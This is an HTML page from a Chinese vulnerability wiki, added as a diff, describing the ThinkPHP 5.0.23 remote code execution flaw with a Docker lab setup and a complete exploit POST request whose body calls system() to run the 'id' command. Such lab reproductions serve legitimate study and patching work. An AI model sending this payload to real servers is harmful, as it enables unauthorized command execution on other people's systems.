@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Thinkphp/5.0.23-rce/README.zh-cn/">
+    <link rel="shortcut icon" href="../../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>ThinkPHP5 5.0.23 远程代码执行漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "ThinkPHP5 5.0.23 \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e", url: "#_top", children: [
+              {title: "\u6f0f\u6d1e\u73af\u5883", url: "#_1" },
+              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_2" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../js/base.js"></script>
+      <script src="../../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../Thinkphp%203.x%20%E6%BC%8F%E6%B4%9E/Thinkphp_3.1.3_sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../Thinkphp%203.x%20%E6%BC%8F%E6%B4%9E/Thinkphp_3.1.3_sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Thinkphp 3.1.3 sql注入漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../" class="btn btn-xs btn-link">
+        ThinkPHP5 5.0.23 Remote Code Execution Vulnerability
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="thinkphp5-5023">ThinkPHP5 5.0.23 远程代码执行漏洞<a class="headerlink" href="#thinkphp5-5023" title="Permanent link">&para;</a></h1>
+<p>ThinkPHP是一款运用极广的PHP开发框架。其5.0.23以前的版本中，获取method的方法中没有正确处理方法名，导致攻击者可以调用Request类任意方法并构造利用链，从而导致远程代码执行漏洞。</p>
+<p>参考链接：</p>
+<ul>
+<li><a href="https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003">https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003</a></li>
+</ul>
+<h2 id="_1">漏洞环境<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>执行如下命令启动一个默认的thinkphp 5.0.23环境：</p>
+<div class="highlight"><pre><span></span><code>docker compose up -d
+</code></pre></div>
+<p>环境启动后，访问<code>http://your-ip:8080</code>即可看到默认的ThinkPHP启动页面。</p>
+<h2 id="_2">漏洞复现<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>发送数据包：</p>
+<div class="highlight"><pre><span></span><code>POST /index.php?s=captcha HTTP/1.1
+Host: localhost
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 72
+
+_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=id
+</code></pre></div>
+<p>成功执行<code>id</code>命令：</p>
+<p><img alt="" src="../1.png" /></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../Thinkphp%203.x%20%E6%BC%8F%E6%B4%9E/Thinkphp_3.1.3_sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../Thinkphp%203.x%20%E6%BC%8F%E6%B4%9E/Thinkphp_3.1.3_sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Thinkphp 3.1.3 sql注入漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../" class="btn btn-xs btn-link">
+        ThinkPHP5 5.0.23 Remote Code Execution Vulnerability
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
